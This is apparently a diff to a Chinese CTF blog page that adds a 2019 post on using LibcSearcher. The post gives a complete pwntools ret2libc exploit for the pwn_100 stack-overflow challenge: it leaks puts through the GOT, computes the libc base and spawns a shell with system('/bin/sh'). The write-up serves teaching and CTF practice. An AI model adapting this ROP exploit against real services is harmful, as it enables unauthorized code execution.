@@ -183,7 +183,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/heap/">heap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/大事/">大事</a></li></ul>
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/heap/">heap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/大事/">大事</a></li></ul>
                     </div>
                 </section>
                 
@@ -259,6 +259,73 @@
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-使用LibcSearcher解题" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/07/27/使用LibcSearcher解题/" class="article-date">
+      <time datetime="2019-07-27T13:30:22.000Z" itemprop="datePublished">2019-07-27</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/07/27/使用LibcSearcher解题/">使用LibcSearcher解题</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>我们都知道，很多时候，我们做pwn题出题者是不会给我们libc文件的，这时候，我们就需要通过各种方法来获得libc的版本，libc的基址等。这时候我们首先想到的就是泄露一个函数的真实地址。这时候，我们就可以来查找我们需要的libc版本以及偏移。在以前，获取一个函数地址之后我们就可以在libc.database网站上直接查找libc版本等信息，但现在这个网站好像不行了，所以我们现在只能通过LibcSearcher库或者pwntools的DynELF来做题。</p>
+<h2 id="LibcSearcher的基本用法"><a href="#LibcSearcher的基本用法" class="headerlink" title="LibcSearcher的基本用法"></a>LibcSearcher的基本用法</h2><p>LibcSearcher库的使用方法是非常简单的，只需要我们泄露出一个函数的真实地址之后，就可以利用这个库自带的工具来得出offset<br>了。具体代码大体如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">obj = LibcSearcher(&apos;puts&apos;,putsaddr) </span><br><span class="line">libc_base = putsaddr - obj.dump(&apos;puts&apos;) //算出libc基地址</span><br><span class="line">system = libc_base+obj.dump(&apos;system&apos;)   //算出各函数的真实地址</span><br><span class="line">bins = libc_base+obj.dump(&apos;str_bin_sh&apos;)</span><br></pre></td></tr></table></figure>
+
+<h2 id="实际案例"><a href="#实际案例" class="headerlink" title="实际案例"></a>实际案例</h2><p>这里我们用攻防世界中的pwn_100这道题来实操一下。<br>这道题是一道非常基础的栈溢出题，是一个64位程序，开启了nx防护。<br>用ida看一下源码<br><img src="/img/pwn_100_1.jpg" alt="avatar"><br><img src="/img/pwn_100_2.jpg" alt="avatar"><br>从这里很容易找出栈溢出漏洞。直接给出脚本吧：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">p = process(&apos;./pwn100&apos;)</span><br><span class="line">e = ELF(&apos;./pwn100&apos;)</span><br><span class="line">puts_plt = e.plt[&apos;puts&apos;]</span><br><span class="line">puts_got = e.got[&apos;puts&apos;]</span><br><span class="line">pop_rdi = 0x400763</span><br><span class="line">pop_rsi = 0x400761</span><br><span class="line">start = 0x400550</span><br><span class="line">payload = &apos;a&apos;*0x48+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(start)</span><br><span class="line">payload = payload.ljust(200,&apos;a&apos;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&apos;~\n&apos;)</span><br><span class="line">putsaddr=u64(p.recv()[-7:-1].ljust(8,&apos;\x00&apos;))</span><br><span class="line">print hex(putsaddr)</span><br><span class="line">obj = LibcSearcher(&apos;puts&apos;,putsaddr)</span><br><span class="line">libc_base = putsaddr - obj.dump(&apos;puts&apos;)</span><br><span class="line">system = libc_base+obj.dump(&apos;system&apos;)</span><br><span class="line">bins = libc_base+obj.dump(&apos;str_bin_sh&apos;)</span><br><span class="line">payload1 = &apos;a&apos;*0x47 + p64(pop_rdi)+p64(bins)+p64(system)+p64(0xdeadbeef).ljust(200,&apos;a&apos;)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">#print(p.recv())</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这样就十分好理解LibcSearcher这个工具了吧，功能强大，使用方便。</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
   
     <article id="post-heap-1" class="article article-type-post" itemscope itemprop="blogPost">
   
